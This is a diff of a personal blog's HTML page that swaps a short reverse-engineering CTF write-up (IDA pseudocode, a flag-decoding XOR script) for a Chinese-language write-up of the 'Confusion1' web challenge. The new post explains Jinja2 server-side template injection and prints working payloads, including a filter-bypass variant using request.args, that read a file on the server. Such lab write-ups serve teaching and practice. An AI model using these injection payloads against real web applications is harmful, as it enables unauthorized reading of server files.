@@ -79,20 +79,20 @@
 
 
 
-<meta name="description" content="Reverse Sign In是一道逆向签到题，签到级别的逆向暂时还在我能力范围内…首先下载文件扔进IDA，然后shift+F12搜索字符串，进入sub_4006E1，f5大法查看伪代码： 1234567891011121314151617181920212223242526__int64 sub_4006E1()&amp;#123;  __int64 result; &#x2F;&#x2F; rax@2  __int64">
+<meta name="description" content="Confusion1好久没有做SSTI的题目了，借着这道题目回忆一下，首先提示要看明白图片并且找到用户的输入点。  这个图画了个大蟒蛇，基本可以确定是在暗示Python了。随便点开一个Login发现是404，查看源代码发现flag的位置: 12345678910&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;&lt;html&gt;&amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Reverse Sign In">
-<meta property="og:url" content="http://yoursite.com/2020/03/14/Reverse-Sign-In/index.html">
+<meta property="og:title" content="Confusion1">
+<meta property="og:url" content="http://yoursite.com/2020/03/15/Confusion1/index.html">
 <meta property="og:site_name" content="RichardLEE&#39;s Blog">
-<meta property="og:description" content="Reverse Sign In是一道逆向签到题，签到级别的逆向暂时还在我能力范围内…首先下载文件扔进IDA，然后shift+F12搜索字符串，进入sub_4006E1，f5大法查看伪代码： 1234567891011121314151617181920212223242526__int64 sub_4006E1()&amp;#123;  __int64 result; &#x2F;&#x2F; rax@2  __int64">
-<meta property="og:image" content="http://yoursite.com/2020/03/14/Reverse-Sign-In/1.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/14/Reverse-Sign-In/2.png">
-<meta property="article:published_time" content="2020-03-14T05:29:36.000Z">
-<meta property="article:modified_time" content="2020-03-14T06:12:33.638Z">
+<meta property="og:description" content="Confusion1好久没有做SSTI的题目了，借着这道题目回忆一下，首先提示要看明白图片并且找到用户的输入点。  这个图画了个大蟒蛇，基本可以确定是在暗示Python了。随便点开一个Login发现是404，查看源代码发现flag的位置: 12345678910&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;&lt;html&gt;&amp;">
+<meta property="og:image" content="http://yoursite.com/2020/03/15/Confusion1/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/15/Confusion1/2.png">
+<meta property="article:published_time" content="2020-03-15T06:48:34.000Z">
+<meta property="article:modified_time" content="2020-03-15T08:18:14.526Z">
 <meta property="article:author" content="Richard LEE">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/03/14/Reverse-Sign-In/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/15/Confusion1/1.png">
 
 
 
@@ -122,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/03/14/Reverse-Sign-In/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/15/Confusion1/"/>
 
 
 
 
 
-  <title>Reverse Sign In | RichardLEE's Blog</title>
+  <title>Confusion1 | RichardLEE's Blog</title>
   
 
 
@@ -235,7 +235,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/Reverse-Sign-In/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/15/Confusion1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Richard LEE">
@@ -252,7 +252,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Reverse Sign In</h1>
+          <h1 class="post-title" itemprop="name headline">Confusion1</h1>
         
 
         <div class="post-meta">
@@ -264,8 +264,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T13:29:36+08:00">
-                2020-03-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-15T14:48:34+08:00">
+                2020-03-15
               </time>
             
 
@@ -302,15 +302,20 @@
       
 
       
-        <h2 id="Reverse-Sign-In"><a href="#Reverse-Sign-In" class="headerlink" title="Reverse Sign In"></a>Reverse Sign In</h2><p>是一道逆向签到题，签到级别的逆向暂时还在我能力范围内…首先下载文件扔进IDA，然后shift+F12搜索字符串，进入sub_4006E1，f5大法查看伪代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4006E1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx@7</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+0h] [bp-30h]@1</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>);</span><br><span class="line">  __isoc99_scanf();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400686((__int64)&amp;s) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><p>好久没有做SSTI的题目了，借着这道题目回忆一下，首先提示要看明白图片并且找到用户的输入点。</p>
+<p><img src="/2020/03/15/Confusion1/1.png" alt></p>
+<p>这个图画了个大蟒蛇，基本可以确定是在暗示Python了。随便点开一个Login发现是404，查看源代码发现flag的位置:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /login.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.10 (Debian) Server at vps1.blue-whale.me Port 23361<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Flag @ /opt/flag_1234qwerty.txt --&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>从代码中可以看出当 s 符合sub_400686(&amp;s)函数的要求时输出“Right”，因此我们要跟进这个函数：</p>
-<p><img src="/2020/03/14/Reverse-Sign-In/1.png" alt></p>
-<p>很好懂，就是进行了简单的异或，这里的a1是形参，实参是main函数的字符串s，现在需要提取byte_400818的数据，双击即可进入byte_400818：</p>
-<p><img src="/2020/03/14/Reverse-Sign-In/2.png" alt></p>
-<p>2 dup(60h)的意思是两个60h，按h可以将其转换为十进制。到此为止可以写脚本解决这道题目了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8       </span></span><br><span class="line">n =  [<span class="number">102</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">127</span>, <span class="number">60</span>, <span class="number">54</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">59</span>,<span class="number">123</span>, <span class="number">82</span>, <span class="number">124</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">96</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">127</span>,<span class="number">113</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">117</span>, <span class="number">42</span>, <span class="number">98</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">31</span>):</span><br><span class="line">    print(chr(n[i] ^ i)),</span><br></pre></td></tr></table></figure>
+<p>因此进一步明确思路要读取/opt/flag_1234qwerty.txt必须要找到用户的输入点，这也是提示的第一条。根据经验应该是Python jinja2的SSTI了，在url里输入<a href="http://vps1.blue-whale.me:23361/login.php" target="_blank" rel="noopener">http://vps1.blue-whale.me:23361/login.php</a>2发现得到了回显，注入点就算是找到了。</p>
+<p><img src="/2020/03/15/Confusion1/2.png" alt></p>
+<p>回顾模板注入的操作：</p>
+<p>获取基本类-获取基本类的子类-寻找命令执行模块</p>
+<p>正常情况下构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;opt&#x2F;flag_1234qwerty.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>.<strong>class_代表基本类 __mro</strong>方法可打印出其继承关系返回的是一个元组，通过下标+<strong>subclasses</strong>的方法可以获取所有子类的列表。而<strong>subclasses</strong>()第40个是file类型的object。但是这个题把class这些字符给过滤了，因此利用flask的request.args进行绕过，最终paylaod为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1234qwerty.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure>
 
 
 
@@ -344,8 +349,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/13/Forensics/" rel="next" title="Forensics">
-                <i class="fa fa-chevron-left"></i> Forensics
+              <a href="/2020/03/14/Global-Page/" rel="next" title="Global Page">
+                <i class="fa fa-chevron-left"></i> Global Page
               </a>
             
           </div>
@@ -353,10 +358,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/03/14/Global-Page/" rel="prev" title="Global Page">
-                Global Page <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -479,7 +480,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-Sign-In"><span class="nav-number">1.</span> <span class="nav-text">Reverse Sign In</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Confusion1"><span class="nav-number">1.</span> <span class="nav-text">Confusion1</span></a></li></ol></div>
             
 
           </div>
